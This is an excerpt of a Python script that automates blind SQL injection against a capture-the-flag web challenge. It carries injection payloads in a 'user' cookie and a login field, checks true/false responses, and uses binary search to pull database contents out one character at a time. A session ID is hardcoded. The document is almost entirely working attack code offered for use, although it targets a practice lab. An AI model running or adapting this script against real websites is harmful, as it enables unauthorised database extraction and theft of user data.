...
phpsess='7sqd562t0ff52rmoidrss51cf3'
userid = "ctfkill"
...
def binSearch(query, checkValue):
    ...
    while True:
        ...
        payload = attackFormatStart+truefalsereverse+attackFunction+query+attackFormatEnd1+str(substridx)+attackFormatEnd2+str(0)+attackFormatEnd3
        response = requests.post(links, cookies={'user':payload,'session':session,'PHPSESSID':phpsess})
        if checkValue in response.text: #checkValue값이 text에 나오면, 그러니까 false response가 보이면
            ...
            payload = attackFormatStart+truefalsereverse+attackFunction+query+attackFormatEnd1+str(substridx)+attackFormatEnd2+str(mid)+attackFormatEnd3
            response = requests.post(links, cookies={'user':payload,'session':session,'PHPSESSID':phpsess})
...
print("\n type link ex : http://ctf.segfaulthub.com:7777/sqli_6/mypage.php")
links = "http://"+input("Link(without parameter) : http://")
sqliCheckPayload = userid+"' and true and '1'='1"



successfulResponse = requests.post(links, cookies={'user':userid,'session':session,'PHPSESSID':phpsess})
sqliResponse = requests.post(links, cookies={'user':sqliCheckPayload,'session':session,'PHPSESSID':phpsess})
...
selectCheckPayload = userid+"' and ((select 'test')='test') and '1'='1"
selectResponse = requests.post(links, data={'UserId':selectCheckPayload,'Password':'3333','Submit':'Login'})
